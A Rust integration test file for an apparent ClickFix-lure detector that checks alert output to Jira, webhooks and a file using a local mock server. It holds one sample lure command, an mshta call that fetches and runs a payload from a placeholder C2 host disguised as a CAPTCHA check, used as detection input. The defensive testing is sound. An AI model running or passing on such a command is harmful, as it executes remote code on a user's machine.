//! End-to-end output tests against a local mock HTTP server. Nothing leaves 127.0.0.1.

use cfx_alert::config::{AlertsConfig, OutputsConfig};
use cfx_alert::outputs::template_ctx;
use cfx_alert::template::Template;
use cfx_alert::*;
use cfx_engine::{DomainClass, Engine, Observation, Origin, Target};
use serde_json::Value;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

fn root() -> PathBuf {
    Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/../.."))
        .canonicalize()
        .unwrap()
}

const LURE: &str =
    "mshta https://c2.invalid/verify.mp4 # I am not a robot - reCAPTCHA Verification ID: 2165";

fn ctx() -> AlertContext {
    AlertContext::new(
        "ws-17".into(),
        "alice".into(),
        Platform::Linux,
        SeverityMap::default(),
        vec!["keepassxc".into()],
    )
}

fn alert(text: &str, target: Target) -> Alert {
    alert_from(
        text,
        Origin::Browser {
            url: Some("https://lure.invalid/captcha".into()),
            domain_class: DomainClass::Unknown,
        },
        target,
    )
}

fn alert_from(text: &str, origin: Origin, target: Target) -> Alert {
    let obs = Observation::new(text).origin(origin).target(target);
    let (v, trace) = Engine::default().fast_path_traced(&obs);
    Alert::build(
        &ctx(),
        AlertInput {
            action: Action::ClipboardCommandFlagged,
            verdict: &v,
            layers: &trace.layers,
            origin: &obs.origin,
            target: &obs.target,
            source_app: Some("firefox"),
            process: None,
            blocked: false,
        },
    )
    .unwrap()
}

// ---------------------------------------------------------------- mock HTTP server

#[derive(Debug, Clone)]
struct Req {
    method: String,
    path: String,
    headers: Vec<(String, String)>,
    body: String,
}

type Handler = Arc<dyn Fn(&Req) -> (u16, String) + Send + Sync>;

struct Mock {
    url: String,
    log: Arc<Mutex<Vec<Req>>>,
}

fn mock(handler: Handler) -> Mock {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", l.local_addr().unwrap());
    let log = Arc::new(Mutex::new(Vec::new()));
    let log2 = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(mut s) = s else { continue };
            let (log, handler) = (log2.clone(), handler.clone());
            std::thread::spawn(move || {
                let mut r = BufReader::new(s.try_clone().unwrap());
                let mut line = String::new();
                if r.read_line(&mut line).unwrap_or(0) == 0 {
                    return;
                }
                let mut parts = line.split_whitespace();
                let method = parts.next().unwrap_or("").to_string();
                let path = parts.next().unwrap_or("").to_string();
                let mut headers = Vec::new();
                let mut len = 0;
                loop {
                    let mut h = String::new();
                    r.read_line(&mut h).unwrap();
                    let h = h.trim_end();
                    if h.is_empty() {
                        break;
                    }
                    if let Some((k, v)) = h.split_once(':') {
                        if k.eq_ignore_ascii_case("content-length") {
                            len = v.trim().parse().unwrap_or(0);
                        }
                        headers.push((k.to_ascii_lowercase(), v.trim().to_string()));
                    }
                }
                let mut body = vec![0; len];
                r.read_exact(&mut body).unwrap();
                let req = Req {
                    method,
                    path,
                    headers,
                    body: String::from_utf8_lossy(&body).into_owned(),
                };
                log.lock().unwrap().push(req.clone());
                let (status, resp) = handler(&req);
                let _ = write!(
                    s,
                    "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp}",
                    resp.len()
                );
            });
        }
    });
    Mock { url, log }
}

fn outputs_toml(s: &str) -> OutputsConfig {
    #[derive(serde::Deserialize)]
    struct F {
        outputs: OutputsConfig,
    }
    toml::from_str::<F>(s).unwrap().outputs
}

// ---------------------------------------------------------------- Jira dedupe

#[test]
fn jira_creates_once_then_comments_and_escalates() {
    // A tiny stateful Jira: one project, issues tracked by label.
    #[derive(Default)]
    struct State {
        issues: Vec<(String, Vec<String>, String)>, // key, labels, priority
    }
    let st = Arc::new(Mutex::new(State::default()));
    let st2 = st.clone();
    let m = mock(Arc::new(move |r: &Req| {
        let mut s = st2.lock().unwrap();
        if r.method == "GET" && r.path.starts_with("/rest/api/2/search/jql") {
            let q = r.path.split("jql=").nth(1).unwrap_or("");
            let hit = s
                .issues
                .iter()
                .find(|(_, labels, _)| labels.iter().any(|l| q.contains(l.as_str())));
            let issues = match hit {
                Some((k, _, p)) => {
                    format!(r#"[{{"key":"{k}","fields":{{"priority":{{"name":"{p}"}}}}}}]"#)
                }
                None => "[]".into(),
            };
            return (200, format!(r#"{{"issues":{issues}}}"#));
        }
        if r.method == "POST" && r.path == "/rest/api/2/issue" {
            let v: Value = serde_json::from_str(&r.body).unwrap();
            let labels = v["fields"]["labels"]
                .as_array()
                .unwrap()
                .iter()
                .map(|l| l.as_str().unwrap().to_string())
                .collect();
            let key = format!("SEC-{}", s.issues.len() + 1);
            s.issues.push((
                key.clone(),
                labels,
                v["fields"]["priority"]["name"]
                    .as_str()
                    .unwrap()
                    .to_string(),
            ));
            return (201, format!(r#"{{"key":"{key}"}}"#));
        }
        if r.method == "POST" && r.path.ends_with("/comment") {
            return (201, "{}".into());
        }
        if r.method == "PUT" {
            let v: Value = serde_json::from_str(&r.body).unwrap();
            let key = r.path.rsplit('/').next().unwrap().to_string();
            if let Some(i) = s.issues.iter_mut().find(|i| i.0 == key) {
                i.2 = v["fields"]["priority"]["name"]
                    .as_str()
                    .unwrap()
                    .to_string();
            }
            return (204, String::new());
        }
        (404, "{}".into())
    }));

    let outputs = outputs_toml(&format!(
        r#"
        [outputs.jira]
        enabled = true
        base_url = "{}"
        project = "SEC"
        issue_type = "Incident"
        user = "soc@example.invalid"
        token = "${{CFX_TEST_JIRA_TOKEN}}"
        template = "templates/jira.json"
        "#,
        m.url
    ));
    let env = Env::from_pairs(&[("CFX_TEST_JIRA_TOKEN", "t0ken")]);
    let mut alerts = AlertsConfig::default();
    alerts.dedupe.suppress_window_secs = 0; // exercise Jira's own dedupe
    let (sink, _) = Sink::start(&alerts, &outputs, vec![], &env, &root()).unwrap();

    // No origin, no target: malicious at 2.9 -> "high".
    let a = alert_from(LURE, Origin::Unknown, Target::Unknown);
    assert_eq!(a.severity_name(), "high");
    sink.emit(a.clone());
    sink.emit(a.clone()); // re-copy of the same command
    sink.emit(a.executed(ProcessInfo {
        pid: 7,
        name: Some("mshta".into()),
        ..Default::default()
    }));
    // Same command seen from a lure page bound for the Run dialog: same hash, higher
    // score -> "critical".
    let crit = alert(LURE, Target::RunDialog);
    assert_eq!(crit.severity_name(), "critical");
    assert_eq!(crit.dedupe_key(), a.dedupe_key());
    sink.emit(crit);
    sink.shutdown();

    let log = m.log.lock().unwrap();
    let creates: Vec<_> = log
        .iter()
        .filter(|r| r.method == "POST" && r.path == "/rest/api/2/issue")
        .collect();
    let comments = log.iter().filter(|r| r.path.ends_with("/comment")).count();
    let puts: Vec<_> = log.iter().filter(|r| r.method == "PUT").collect();
    assert_eq!(creates.len(), 1, "one ticket per host+command");
    assert_eq!(comments, 3, "repeats become comments");
    assert_eq!(puts.len(), 1, "escalation updates priority once");
    assert!(puts[0].body.contains("Highest"));

    let created: Value = serde_json::from_str(&creates[0].body).unwrap();
    assert_eq!(created["fields"]["project"]["key"], "SEC");
    assert_eq!(created["fields"]["issuetype"]["name"], "Incident");
    assert_eq!(created["fields"]["priority"]["name"], "High");
    let label = format!("clickfixed-{}", &a.dedupe_key()[..32]);
    assert!(created["fields"]["labels"]
        .as_array()
        .unwrap()
        .iter()
        .any(|l| l == &label));
    let auth = log[0]
        .headers
        .iter()
        .find(|(k, _)| k == "authorization")
        .unwrap();
    assert!(auth.1.starts_with("Basic "));
    // Privacy: no request body carries the raw command.
    for r in log.iter() {
        assert!(
            !r.body.contains("mshta https://c2.invalid"),
            "raw command sent to Jira"
        );
    }
    assert_eq!(st.lock().unwrap().issues[0].2, "Highest");
}

// ---------------------------------------------------------------- isolation

#[test]
fn slow_and_failing_webhooks_do_not_block_file_output() {
    let hang = mock(Arc::new(|_r: &Req| {
        std::thread::sleep(Duration::from_secs(3));
        (200, "{}".into())
    }));
    let fail = mock(Arc::new(|_r: &Req| (500, "{}".into())));
    let dir = std::env::temp_dir().join(format!("cfx-iso-{}", std::process::id()));
    let file = dir.join("alerts.json");
    let outputs = outputs_toml(&format!(
        r#"
        [outputs.file]
        enabled = true
        path = "{}"
        [[outputs.webhook]]
        name = "hang"
        url = "{}/hook"
        template = "templates/generic.json"
        timeout_secs = 2
        retries = 0
        [[outputs.webhook]]
        name = "fail"
        url = "{}/hook"
        template = "templates/slack.json"
        retries = 1
        "#,
        file.display(),
        hang.url,
        fail.url
    ));
    let (sink, _) = Sink::start(
        &AlertsConfig::default(),
        &outputs,
        vec![],
        &Env::default(),
        &root(),
    )
    .unwrap();
    let a = alert(LURE, Target::Unknown);
    let t0 = Instant::now();
    sink.emit(a);
    let emit_cost = t0.elapsed();
    // The file line lands while the hanging webhook is still waiting.
    let deadline = Instant::now() + Duration::from_millis(1500);
    let mut written = false;
    while Instant::now() < deadline {
        if std::fs::read_to_string(&file)
            .map(|s| s.lines().count() == 1)
            .unwrap_or(false)
        {
            written = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    assert!(written, "file output was blocked by a webhook");
    assert!(
        emit_cost < Duration::from_millis(50),
        "emit blocked: {emit_cost:?}"
    );
    sink.shutdown();
    // The failing endpoint was retried (1 + 1 retry) and then gave up.
    assert_eq!(fail.log.lock().unwrap().len(), 2);
    let line: Value = serde_json::from_str(
        std::fs::read_to_string(&file)
            .unwrap()
            .lines()
            .next()
            .unwrap(),
    )
    .unwrap();
    assert_eq!(line["event"]["module"], "clickfixed");
    std::fs::remove_dir_all(&dir).ok();
}

// ---------------------------------------------------------------- startup

#[test]
fn startup_names_every_missing_secret_and_bad_template() {
    let outputs = outputs_toml(
        r#"
        [outputs.jira]
        enabled = true
        base_url = "https://jira.invalid"
        project = "SEC"
        user = "${CFX_TEST_UNSET_JIRA_USER}"
        token = "${CFX_TEST_UNSET_JIRA_TOKEN}"
        [[outputs.webhook]]
        name = "slack"
        url = "${CFX_TEST_UNSET_SLACK_URL}"
        template = "templates/slack.json"
        min_severity = "hgih"
        [[outputs.webhook]]
        name = "literal-secret"
        url = "https://soar.invalid/x"
        template = "templates/generic.json"
        headers = { Authorization = "Bearer hardcoded" }
        "#,
    );
    let err = match Sink::start(
        &AlertsConfig::default(),
        &outputs,
        vec![],
        &Env::default(),
        &root(),
    ) {
        Err(e) => e.to_string(),
        Ok(_) => panic!("must fail"),
    };
    for needle in [
        "CFX_TEST_UNSET_JIRA_USER",
        "CFX_TEST_UNSET_JIRA_TOKEN",
        "CFX_TEST_UNSET_SLACK_URL",
        "\"hgih\"",
        "Authorization looks like a credential",
    ] {
        assert!(err.contains(needle), "missing {needle} in:\n{err}");
    }

    let literal = outputs_toml(
        r#"
        [outputs.jira]
        enabled = true
        base_url = "https://jira.invalid"
        project = "SEC"
        user = "a@b"
        token = "abc123"
        "#,
    );
    let err = Sink::start(
        &AlertsConfig::default(),
        &literal,
        vec![],
        &Env::default(),
        &root(),
    )
    .err()
    .unwrap()
    .to_string();
    assert!(err.contains("never read from the config file"), "{err}");
}

#[test]
fn template_typo_fails_at_startup() {
    let dir = std::env::temp_dir().join(format!("cfx-tpl-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("t.json"), r#"{"x": "{{clickfixed.scroe}}"}"#).unwrap();
    let outputs = outputs_toml(
        r#"
        [[outputs.webhook]]
        name = "t"
        url = "https://x.invalid"
        template = "t.json"
        "#,
    );
    let err = Sink::start(
        &AlertsConfig::default(),
        &outputs,
        vec![],
        &Env::default(),
        &dir,
    )
    .err()
    .unwrap()
    .to_string();
    assert!(err.contains("clickfixed.scroe"), "{err}");
    std::fs::remove_dir_all(&dir).ok();
}

// ---------------------------------------------------------------- committed artifacts

#[test]
fn shipped_templates_validate_and_never_carry_raw_content() {
    let a = alert(LURE, Target::RunDialog);
    let mut ctx = template_ctx(&a);
    ctx.as_object_mut().unwrap().insert(
        "jira".into(),
        serde_json::json!({"project": "SEC", "issue_type": "Bug", "dedupe_label": "x"}),
    );
    for t in ["slack", "jira", "generic"] {
        let tpl = Template::load(&root().join(format!("templates/{t}.json"))).unwrap();
        tpl.validate(&ctx).unwrap();
        let out = tpl.render(&ctx).to_string();
        for w in LURE.as_bytes().windows(12) {
            let s = std::str::from_utf8(w).unwrap();
            assert!(!out.contains(s), "{t}: raw fragment {s:?} leaked");
        }
    }
}

/// `docs/sample-alert.json` is the schema reviewers read. Built from corpus row M17,
/// a plain command, so `decoded` is null: it is only set when the deobfuscator resolves a
/// layer. Regenerate with
/// `UPDATE_SAMPLES=1 cargo test -p cfx-alert`.
#[test]
fn committed_sample_alert_is_current() {
    let mut rdr = csv::Reader::from_path(root().join("corpus/malicious.csv")).unwrap();
    let hdr = rdr.headers().unwrap().clone();
    let col = |n: &str| hdr.iter().position(|h| h == n).unwrap();
    let row = rdr
        .records()
        .map(|r| r.unwrap())
        .find(|r| &r[col("id")] == "M17")
        .unwrap();
    let text = row[col("text")].to_string();
    let obs = Observation::new(text)
        .origin(Origin::Browser {
            url: Some("https://ai-tool-setup.invalid/install?ref=ad#steps".into()),
            domain_class: DomainClass::Unknown,
        })
        .target(Target::Unknown);
    let (v, trace) = Engine::default().fast_path_traced(&obs);
    let t = time::macros::datetime!(2026-11-04 16:38:18.045 UTC);
    let a = Alert::build_at(
        &ctx(),
        AlertInput {
            action: Action::ClipboardCommandFlagged,
            verdict: &v,
            layers: &trace.layers,
            origin: &obs.origin,
            target: &obs.target,
            source_app: Some("firefox"),
            process: None,
            blocked: false,
        },
        t,
    )
    .unwrap();
    let executed = a.executed_at(
        ProcessInfo {
            pid: 48213,
            name: Some("bash".into()),
            executable: Some("/usr/bin/bash".into()),
            parent_name: Some("zsh".into()),
        },
        t + time::Duration::seconds(9),
    );
    let doc = serde_json::json!({
        "_comment": "Generated by crates/cfx-alert/tests/outputs.rs from corpus row M17. Raw command is never carried: only its sha256, plus the decoded layer when the deobfuscator resolves one.",
        "clipboard_command_flagged": a.to_value(),
        "pasted_command_executed": executed.to_value(),
    });
    let got = serde_json::to_string_pretty(&doc).unwrap() + "\n";
    check_or_update(&root().join("docs/sample-alert.json"), &got);

    // One JSON line exactly as the file output writes it.
    check_or_update(
        &root().join("docs/sample-alert.jsonl"),
        &(a.to_json_line() + "\n" + &executed.to_json_line() + "\n"),
    );
}

#[test]
fn committed_wazuh_rules_match_default_mapping() {
    let got = cfx_alert::wazuh::rules_xml(&SeverityMap::default());
    check_or_update(&root().join("wazuh/rules/clickfixed_rules.xml"), &got);
}

#[test]
fn example_config_mapping_is_the_default() {
    #[derive(serde::Deserialize)]
    struct F {
        alerts: AlertsConfig,
    }
    let s = std::fs::read_to_string(root().join("clickfixed.example.toml")).unwrap();
    let v: toml::Table = toml::from_str(&s).unwrap();
    let alerts: F = toml::from_str(
        &toml::to_string(&toml::Table::from_iter(
            v.get("alerts").map(|a| ("alerts".to_string(), a.clone())),
        ))
        .unwrap(),
    )
    .unwrap();
    assert_eq!(alerts.alerts.severity, cfx_alert::severity::default_bands());
}

fn check_or_update(path: &Path, got: &str) {
    if std::env::var_os("UPDATE_SAMPLES").is_some() {
        std::fs::write(path, got).unwrap();
        return;
    }
    let want = std::fs::read_to_string(path).unwrap_or_else(|_| {
        panic!(
            "{} missing; run UPDATE_SAMPLES=1 cargo test -p cfx-alert",
            path.display()
        )
    });
    assert_eq!(
        want,
        got,
        "{} is stale; run UPDATE_SAMPLES=1 cargo test -p cfx-alert",
        path.display()
    );
}
